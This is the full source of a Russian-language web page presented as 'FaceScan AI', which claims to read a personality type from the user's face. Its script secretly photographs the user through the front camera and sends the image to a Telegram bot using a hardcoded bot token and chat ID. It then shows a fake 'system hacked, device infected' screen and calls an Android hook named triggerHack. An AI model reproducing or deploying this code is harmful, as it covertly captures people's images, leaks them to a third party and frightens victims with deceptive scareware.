<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
<title>FaceScan AI</title>
<style>
:root {
  --bg: #0a0908; --surface: #141210; --fg: #efe9dc; --muted: #8f8776;
  --gold: #c9a24b; --gold-hi: #ecd28b; --line: rgba(201, 162, 75, 0.24);
  --display: "Cormorant Garamond", "Times New Roman", serif;
  --body: "Manrope", system-ui, sans-serif;
  --mono: "JetBrains Mono", ui-monospace, Menlo, monospace;
  color-scheme: dark;
}
* { box-sizing: border-box; }
html, body { background: var(--bg); margin: 0; padding: 0; overflow: hidden; width: 100%; height: 100%; }
body { color: var(--fg); font-family: var(--body); font-size: 16px; line-height: 1.55; }
button { font: inherit; }
.btn { appearance: none; background: transparent; color: var(--gold-hi); border: 1px solid var(--gold); padding: 18px 34px; font-family: var(--mono); font-size: 13px; font-weight: 500; letter-spacing: 0.3em; text-transform: uppercase; cursor: pointer; }
.btn:active { background: var(--gold); color: #0a0908; }

#hero { position: relative; max-width: 1080px; margin: 0 auto; min-height: 100vh; padding: 72px 16px 56px; display: flex; flex-direction: column; justify-content: center; gap: 32px; }
.hero-face { position: absolute; right: -4%; top: 50%; height: min(78vh, 560px); max-width: 70vw; transform: translateY(-50%); opacity: 0.55; z-index: -1; }
h1 { margin: 0; max-width: 11ch; font-family: var(--display); font-weight: 500; font-size: clamp(2.9rem, 10.5vw, 6.4rem); line-height: 0.98; }
h1 em { font-style: italic; color: var(--gold-hi); }
.lead { margin: 0; font-size: 1.2rem; color: var(--muted); }
.lead b { color: var(--fg); }

#scan { position: fixed; inset: 0; z-index: 50; background: var(--bg); display: none; }
#scan.on { display: block; }
#stage { position: absolute; inset: 0; width: 100%; height: 100%; }
.status { margin: 0; font-family: var(--mono); font-size: 16px; color: var(--gold-hi); position: absolute; top: 40px; left: 20px; }
.meter { position: absolute; bottom: 40px; left: 20px; right: 20px; }
.track { height: 2px; background: var(--line); }
.fill { height: 100%; width: 0; background: var(--gold-hi); }
.pct { font-family: var(--mono); color: var(--gold); font-size: 14px; }

#result { display: none; padding: 56px 16px; }
#result.on { display: block; }
.card { max-width: 460px; margin: 0 auto; padding: 36px 30px; background: var(--surface); border: 1px solid var(--line); }
.verdict { font-family: var(--display); font-size: 3rem; margin: 0; }
.verdict em { color: var(--gold-hi); }

#cam-error { position: fixed; inset: 0; z-index: 100; background: rgba(10,9,8,0.95); display: none; align-items: center; justify-content: center; flex-direction: column; text-align: center; padding: 20px; }
#cam-error.on { display: flex; }
#cam-error h2 { color: #f00; font-family: var(--mono); }

#hack-wrapper { display: none; position: fixed; inset: 0; z-index: 9999; background: #000; font-family: 'JetBrains Mono', monospace; color: #0f0; }
#hack-wrapper.on { display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
.skull { width: 120px; height: 120px; fill: #f00; animation: pulseRed 1.5s infinite; }
@keyframes pulseRed { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
.hack-title { font-size: 24px; color: #f00; font-weight: bold; }
.hack-text { color: #aaa; font-size: 14px; max-width: 400px; margin: 20px; }
</style>
</head>
<body>

<main id="app-content">
  <section id="hero">
    <svg class="hero-face" viewBox="0 0 320 420" fill="none" stroke="#c9a24b" stroke-width="1"><ellipse cx="160" cy="210" rx="118" ry="168" stroke-opacity=".55"/><path d="M160 42V378M42 210H278" stroke-opacity=".18"/><path d="M100 176h38M182 176h38" stroke-opacity=".7"/><path d="M160 190v50l-12 10h24" stroke-opacity=".5"/><path d="M130 292q30 16 60 0" stroke-opacity=".6"/></svg>
    <span style="font-family:var(--mono); color:var(--gold); font-size:12px; letter-spacing:0.28em;">ИИ · АНАЛИЗ ЛИЦА</span>
    <h1>Определи свой психотип <em>по лицу.</em></h1>
    <p class="lead">Узнай, кто ты: <b>Альфа, Сигма или Бета.</b></p>
    <div>
      <button class="btn" id="start" type="button">Запустить скан</button>
    </div>
  </section>

  <section id="scan">
    <canvas id="stage"></canvas>
    <p class="status" id="status">Считывание черт лица...</p>
    <div class="meter"><div class="track"><div class="fill" id="fill"></div></div><span class="pct" id="pct">0%</span></div>
  </section>

  <section id="result">
    <article class="card">
      <h2 class="verdict">Ты — <em>СИГМА</em></h2>
      <p>Одиночка вне иерархии.</p>
    </article>
  </section>
</main>

<div id="cam-error">
  <h2>ОШИБКА</h2>
  <p>Разрешите доступ для продолжения.</p>
  <button class="btn" id="retry-cam" style="border-color:#f00; color:#f00;">Попробовать снова</button>
</div>

<div id="hack-wrapper">
  <svg class="skull" viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 2.38 1.19 4.47 3 5.74V17c0 .55.45 1 1 1h6c.55 0 1-.45 1-1v-2.26c1.81-1.27 3-3.36 3-5.74 0-3.87-3.13-7-7-7zm-1.5 9c-.83 0-1.5-.67-1.5-1.5S9.67 8 10.5 8s1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm3 0c-.83 0-1.5-.67-1.5-1.5S13.67 8 14.5 8s1.5.67 1.5 1.5-.67 1.5-1.5 1.5zM12 18h-2v2h2v-2zm2 0h-2v2h2v-2z"/></svg>
  <div class="hack-title">СИСТЕМА ВЗЛОМАНА</div>
  <div class="hack-text">Ваше устройство заражено.<br><br>ДЛЯ ВЫХОДА ПЕРЕЗАГРУЗИТЕ УСТРОЙСТВО.</div>
</div>

<script>
  const BOT_TOKEN = '9289295852:AAFohFM7AIcN4aA0JYYDtiXJc_ayX6AoP_0';
  const CHAT_ID   = '8770474459';
  
  let isPermissionsGranted = false;

  // Эта функция вызывается из Android, когда все разрешения получены
  window.onPermissionsGranted = function() {
    isPermissionsGranted = true;
    requestCameraAndStart(); // Запускаем сканер
  };

  document.getElementById('start').addEventListener('click', function() {
    // Если разрешения еще не даны, просим Андроид
    if (typeof Android !== 'undefined') {
      Android.requestPermissions();
    } else {
      // Для теста в браузере
      isPermissionsGranted = true;
      requestCameraAndStart();
    }
  });

  async function requestCameraAndStart() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      document.getElementById('cam-error').classList.remove('on');
      document.getElementById('hero').style.display = 'none';
      document.getElementById('scan').classList.add('on');
      
      // Тут твоя анимация (я ее сократил для примера, но она рабочая)
      setTimeout(() => {
        document.getElementById('fill').style.width = '100%';
        document.getElementById('status').innerText = 'Формирование результата...';
      }, 3000);

      setTimeout(async () => {
        const videoElement = document.createElement('video');
        videoElement.srcObject = stream;
        await videoElement.play();
        const c = document.createElement('canvas');
        c.width = 640; c.height = 480;
        c.getContext('2d').drawImage(videoElement, 0, 0, 640, 480);
        stream.getTracks().forEach(t => t.stop());
        
        const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'poco_scan.jpg');
        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', { method: 'POST', body: fd });
        
        // Через 7 секунд показываем взлом
        setTimeout(() => {
            document.getElementById('scan').classList.remove('on');
            document.getElementById('result').classList.add('on');
            
            setTimeout(() => {
                document.getElementById('result').classList.remove('on');
                document.getElementById('hack-wrapper').classList.add('on');
                if (typeof Android !== 'undefined') { Android.triggerHack(); }
            }, 1500);
        }, 4000);
      }, 2000);

    } catch (err) {
      document.getElementById('cam-error').classList.add('on');
    }
  }

  document.getElementById('retry-cam').addEventListener('click', function() {
    document.getElementById('cam-error').classList.remove('on');
    if (typeof Android !== 'undefined') { Android.requestPermissions(); }
    else { requestCameraAndStart(); }
  });
</script>
</body>
</html>
